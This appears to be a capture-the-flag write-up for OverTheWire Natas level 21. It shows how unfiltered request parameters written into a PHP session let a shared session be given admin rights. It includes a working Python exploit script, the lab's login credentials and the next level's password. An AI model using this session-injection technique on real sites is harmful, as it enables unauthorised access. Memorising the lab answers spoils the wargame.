# Level 21

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas21.natas.labs.overthewire.org](http://natas21.natas.labs.overthewire.org)
- username: `natas21`
- password: `89OWrTkGmiLZLv12JY4tLj2c4FW0xn56`

## Solution

![start](./start.jpg)

Let's see the website from the link:

![start_ex](./start_ex.jpg)

Let's see it's sourcecode:

```php
...
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
...
```

This part of code: 

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

checks if the `submit` key exists and if it is, then it adds all keys from `$_REQUEST` to `$_SESSION`. So we can include any data in our request, and it will be stored in the session *(for example `example.com?submit=anything&debug=anything&admin=1`)*. So let's slightly modify python script from [Level 20](https://github.com/bu19akov/CTF-Challenge-Solutions/tree/main/OverTheWire/Natas/level_20) to get the admin rights:

```py
import requests
from bs4 import BeautifulSoup

# Base URL
url = 'http://natas21-experimenter.natas.labs.overthewire.org/'

# Function to make two GET requests (first one to write to the file, second one - to read)
def send_2_get_requests():
    # Cookies dictionary
    cookies = dict()

    # Our parameters (with name and debug set to whatever)
    params = dict(submit="1", debug="1", admin=1)
    
    headers = {
        'Authorization': 'Basic bmF0YXMyMTo4OU9XclRrR21pTFpMdjEySlk0dExqMmM0RlcweG41Ng==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas21.natas.labs.overthewire.org',
        'Referer': 'http://natas21.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the GET request with out params (name and debug)
    response_from_write = requests.get(url, headers=headers, params=params, cookies=cookies)

    # Get the PHPSESSID from the response
    phpsessid = response_from_write.cookies['PHPSESSID']

    print(phpsessid)

    # Modify the params to exlude `name` and `admin` parameters
    params = dict(debug="1")

    # Set the PHPSESSID for the next request
    cookies = dict(PHPSESSID=phpsessid)

    # Send request to the first url with modified parameters and PHPSESSID cookie
    response_from_read = requests.get("http://natas21.natas.labs.overthewire.org", headers=headers, params=params, cookies=cookies)
    
    # response_from_read.text contains the HTML content
    html_content = response_from_read.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find the <pre> tag
    pre_tag = soup.find('pre')

    print(pre_tag.get_text())

send_2_get_requests()
```

Output:

```
2f0da908n4anr2vdljhhrqq3ae
Username: natas22
Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
```

## Password

`natas22`:`91awVM9oDiUGm33JdzM7RVLBS8bz9n0s`

*Created by [bu19akov](https://github.com/bu19akov)*